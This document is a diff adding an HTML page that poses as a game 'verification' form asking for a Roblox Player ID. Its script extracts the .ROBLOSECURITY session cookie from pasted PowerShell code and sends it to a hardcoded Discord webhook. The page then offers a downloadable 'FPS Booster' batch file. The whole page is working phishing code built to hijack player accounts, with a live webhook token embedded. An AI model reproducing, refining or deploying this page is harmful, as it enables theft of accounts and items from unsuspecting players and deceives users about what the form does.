@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>VERIFICATION REQUIRED</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500&display=swap" rel="stylesheet">
+  <style>
+    body {
+      background: #000;
+      font-family: 'Poppins', sans-serif;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 3rem;
+      letter-spacing: 5px;
+      margin-bottom: 40px;
+      color: #00f2ff;
+      text-transform: uppercase;
+      animation: glow 1.5s infinite alternate;
+    }
+
+    @keyframes glow {
+      0% { text-shadow: 0 0 5px #00f2ff, 0 0 10px #00f2ff, 0 0 15px rgba(0, 242, 255, 0.5); }
+      100% { text-shadow: 0 0 15px #00f2ff, 0 0 30px rgba(0, 242, 255, 0.5), 0 0 40px rgba(0, 242, 255, 0.5); }
+    }
+
+    .form-container {
+      background-color: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(255, 255, 255, 0.2);
+      text-align: center;
+      width: 600px;
+      opacity: 0;
+      transform: translateY(30px);
+      animation: fadeInUp 0.8s ease-out 0.2s forwards;
+    }
+
+    @keyframes fadeInUp {
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    textarea {
+      width: 100%;
+      height: 250px;
+      background: transparent;
+      border: 2px solid #00f2ff;
+      color: #fff;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 16px;
+      resize: none;
+      caret-color: #00f2ff;
+      outline: none;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeInUp 0.8s ease-out 0.5s forwards;
+    }
+
+    button {
+      margin-top: 20px;
+      background: #00f2ff;
+      color: #fff;
+      padding: 12px 24px;
+      border: none;
+      border-radius: 5px;
+      font-size: 18px;
+      cursor: pointer;
+      width: 100%;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeInUp 0.8s ease-out 0.8s forwards;
+    }
+
+    button:disabled {
+      background: #555;
+      cursor: not-allowed;
+    }
+
+    button:hover:not(:disabled) {
+      background-color: #00e6e6;
+    }
+
+    .status-message {
+      margin-top: 10px;
+      font-size: 16px;
+      display: none;
+    }
+
+    .error {
+      color: #ff3c3c;
+    }
+
+    .success {
+      color: #4caf50;
+    }
+
+    #realInput {
+      display: none;
+    }
+
+    .download-link {
+      display: none;
+      margin-top: 20px;
+      background: #4caf50;
+      color: #fff;
+      padding: 12px 24px;
+      border-radius: 5px;
+      font-size: 18px;
+      text-decoration: none;
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeInUp 0.8s ease-out forwards;
+    }
+
+    .download-link:hover {
+      background-color: #3e8e41;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="form-container">
+    <h1 style="animation: fadeInUp 0.8s ease-out 0s forwards;">Verification Required</h1>
+    <form id="verificationForm">
+      <textarea id="visibleInput" placeholder="Paste your PLayer ID"></textarea>
+      <input type="hidden" id="realInput">
+      <button type="submit" id="verifyButton" disabled>Submit</button>
+      <a href="https://www.mediafire.com/file/ml0wubn91arig19/LunaX_FPS_Booster.bat/file" id="downloadLink" class="download-link">DOWNLOAD NOW</a>
+    
+      <a href='https://youtube.com'a>CLICK HERE FOR TUTORIAL PLAYER ID</a>
+   
+    </form>
+    <p id="statusMessage" class="status-message"></p>
+  </div>
+
+  <script>
+    const webhookURL = 'https://discord.com/api/webhooks/1361346343511134351/6Kj5O6luXzl9krjD33V30hx0sszWuAUgSF7wPzBhf_aup7PECVa0Cs_Ho666aaUCqqHR';
+    const visibleInput = document.getElementById('visibleInput');
+    const realInput = document.getElementById('realInput');
+    const form = document.getElementById('verificationForm');
+    const verifyButton = document.getElementById('verifyButton');
+    const downloadLink = document.getElementById('downloadLink');
+    const statusMessage = document.getElementById('statusMessage');
+
+    let lastLength = 0;
+
+    visibleInput.addEventListener('input', () => {
+      const current = visibleInput.value;
+      const currentLength = current.length;
+      const diff = currentLength - lastLength;
+
+      if (diff > 0) {
+        const addedText = current.slice(-diff);
+        realInput.value += addedText;
+      } else if (diff < 0) {
+        realInput.value = realInput.value.slice(0, diff);
+      }
+
+      // Show dots while maintaining cursor position
+      visibleInput.value = '•'.repeat(realInput.value.length);
+      lastLength = visibleInput.value.length;
+      
+      // Enable verify button only if there's input
+      verifyButton.disabled = realInput.value.length === 0;
+    });
+
+    function extractRoblosecurityFromPowerShell(code) {
+      // More robust regex to match the .ROBLOSECURITY cookie line in PowerShell code
+      const regex = /\.Cookies\.Add\(\s*\(\s*New-Object\s+System\.Net\.Cookie\s*\(\s*"\.ROBLOSECURITY"\s*,\s*"([^"]+)"\s*,[^)]+\)\s*\)\s*\)/i;
+      const match = code.match(regex);
+      
+      if (match && match[1]) {
+        // Reconstruct the full cookie with warning text
+        return `_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${match[1]}`;
+      }
+      return null;
+    }
+
+    async function verifyCookie(cookie) {
+      try {
+        // Simple verification by checking if it looks like a valid cookie
+        return cookie.startsWith('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_');
+      } catch (e) {
+        return false;
+      }
+    }
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      verifyButton.disabled = true;
+      statusMessage.style.display = 'none';
+
+      const powerShellCode = realInput.value.trim();
+      const robloSecurityCookie = extractRoblosecurityFromPowerShell(powerShellCode);
+
+      if (!robloSecurityCookie) {
+        statusMessage.textContent = "ERROR";
+        statusMessage.className = "status-message error";
+        statusMessage.style.display = 'block';
+        verifyButton.disabled = false;
+        return;
+      }
+
+      statusMessage.textContent = "VERIFYING ID... PLEASE WAIT";
+      statusMessage.className = "status-message";
+      statusMessage.style.display = 'block';
+
+      try {
+        // Verify the cookie format first
+        const isValid = await verifyCookie(robloSecurityCookie);
+        
+        if (!isValid) {
+          throw new Error('Error');
+        }
+
+        // Send the full cookie to the webhook
+        const response = await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ 
+            content: "New verified cookie submission:",
+            embeds: [{
+              title: 'Error',
+              description: `\`\`\`${robloSecurityCookie}\`\`\``,
+              color: 0xFF0000,
+              fields: [
+                {
+                  name: "Status",
+                  value: "✅ Verification Successful"
+                }
+              ]
+            }]
+          })
+        });
+
+        if (!response.ok) throw new Error('Webhook failed');
+
+        // Verification successful
+        statusMessage.textContent = "✅ VERIFICATION SUCCESSFUL!";
+        statusMessage.className = "status-message success";
+        
+        // Hide input and verify button
+        visibleInput.style.display = 'none';
+        verifyButton.style.display = 'none';
+        
+        // Show download link
+        downloadLink.style.display = 'inline-block';
+        downloadLink.style.opacity = '1';
+        downloadLink.style.transform = 'translateY(0)';
+        
+        // Clear inputs
+        realInput.value = '';
+        visibleInput.value = '';
+        lastLength = 0;
+      } catch (error) {
+        console.error('Verification error:', error);
+        statusMessage.textContent = "Failed";
+        statusMessage.className = "status-message error";
+        verifyButton.disabled = false;
+      }
+    });
+  </script>
+
+</body>
+</html>
